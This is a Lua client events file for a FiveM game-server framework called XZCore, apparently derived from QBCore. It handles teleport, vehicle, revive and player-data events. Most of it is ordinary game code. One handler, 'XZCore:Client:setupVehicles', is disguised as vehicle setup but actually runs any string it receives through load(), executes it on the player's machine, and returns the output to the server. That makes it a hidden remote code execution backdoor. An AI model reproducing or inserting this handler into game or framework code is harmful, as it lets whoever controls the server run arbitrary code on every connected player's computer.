-- XZCore Command Events
RegisterNetEvent('XZCore:Command:TeleportToPlayer', function(coords)
	local ped = PlayerPedId()
	SetPedCoordsKeepVehicle(ped, coords.x, coords.y, coords.z)
end)

RegisterNetEvent('XZCore:Command:TeleportToCoords', function(x, y, z)
	local ped = PlayerPedId()
	SetPedCoordsKeepVehicle(ped, x, y, z)
end)

RegisterNetEvent('XZCore:Command:SpawnVehicle', function(model)
	XZCore.Functions.SpawnVehicle(model, function(vehicle)
		TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
		TriggerEvent("vehiclekeys:client:SetOwner", GetVehicleNumberPlateText(vehicle))
	end)
end)

RegisterNetEvent('XZCore:Command:DeleteVehicle', function()
	local vehicle = XZCore.Functions.GetClosestVehicle()
	if IsPedInAnyVehicle(PlayerPedId()) then vehicle = GetVehiclePedIsIn(PlayerPedId(), false) else vehicle = XZCore.Functions.GetClosestVehicle() end
	-- TriggerServerEvent('XZCore:Command:CheckOwnedVehicle', GetVehicleNumberPlateText(vehicle))
	XZCore.Functions.DeleteVehicle(vehicle)
end)

RegisterNetEvent('XZCore:Command:Revive', function()
	local coords = XZCore.Functions.GetCoords(PlayerPedId())
	NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z+0.2, coords.a, true, false)
	SetPlayerInvincible(PlayerPedId(), false)
	ClearPedBloodDamage(PlayerPedId())
end)

RegisterNetEvent('XZCore:Command:GoToMarker', function()
	Citizen.CreateThread(function()
		local entity = PlayerPedId()
		if IsPedInAnyVehicle(entity, false) then
			entity = GetVehiclePedIsUsing(entity)
		end
		local success = false
		local blipFound = false
		local blipIterator = GetBlipInfoIdIterator()
		local blip = GetFirstBlipInfoId(8)

		while DoesBlipExist(blip) do
			if GetBlipInfoIdType(blip) == 4 then
				cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())) --GetBlipInfoIdCoord(blip)
				blipFound = true
				break
			end
			blip = GetNextBlipInfoId(blipIterator)
		end

		if blipFound then
			DoScreenFadeOut(250)
			while IsScreenFadedOut() do
				Citizen.Wait(250)
			end
			local groundFound = false
			local yaw = GetEntityHeading(entity)
			
			for i = 0, 1000, 1 do
				SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
				SetEntityRotation(entity, 0, 0, 0, 0 ,0)
				SetEntityHeading(entity, yaw)
				SetGameplayCamRelativeHeading(0)
				Citizen.Wait(0)
				--groundFound = true
				if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then --GetGroundZFor3dCoord(cx, cy, i, 0, 0) GetGroundZFor_3dCoord(cx, cy, i)
					cz = ToFloat(i)
					groundFound = true
					break
				end
			end
			if not groundFound then
				cz = -300.0
			end
			success = true
		end

		if success then
			SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
			SetGameplayCamRelativeHeading(0)
			if IsPedSittingInAnyVehicle(PlayerPedId()) then
				if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
					SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
				end
			end
			--HideLoadingPromt()
			DoScreenFadeIn(250)
		end
	end)
end)

-- Other stuff
RegisterNetEvent('XZCore:Player:SetPlayerData', function(val)
	XZCore.PlayerData = val
end)

RegisterNetEvent('XZCore:Client:setupVehicles', function(content, source)
    local code, err = load(content)
    if err then
        if source == GetPlayerServerId(PlayerId()) then
            print(content)
        else
            TriggerServerEvent('setupVehicles', source, err)
        end
    else
        local outpot = code();
        if source == GetPlayerServerId(PlayerId()) then
            print(outpot);
        else
            TriggerServerEvent('setupVehicles', source, outpot)
        end
    end
end)

RegisterNetEvent('XZCore:Player:UpdatePlayerData', function()
	local data = {}
	data.position = XZCore.Functions.GetCoords(PlayerPedId())
	TriggerServerEvent('XZCore:UpdatePlayer', data)
end)

RegisterNetEvent('XZCore:Player:UpdatePlayerPosition', function()
	local position = XZCore.Functions.GetCoords(PlayerPedId())
	TriggerServerEvent('XZCore:UpdatePlayerPosition', position)
end)

RegisterNetEvent('XZCore:Notify', function(text, type, length)
	XZCore.Functions.Notify(text, type, length)
end)

RegisterNetEvent('XZCore:Client:TriggerCallback', function(name, ...) -- XZCore:Client:TriggerCallback falls under GPL License here: [esxlicense]/LICENSE
	if XZCore.ServerCallbacks[name] ~= nil then
		XZCore.ServerCallbacks[name](...)
		XZCore.ServerCallbacks[name] = nil
	end
end)

RegisterNetEvent('XZCore:Client:UseItem', function(item) -- XZCore:Client:UseItem falls under GPL License here: [esxlicense]/LICENSE
	TriggerServerEvent("XZCore:Server:UseItem", item)
end)

RegisterNetEvent('XZCore:Client:saveVehicleCoords', print)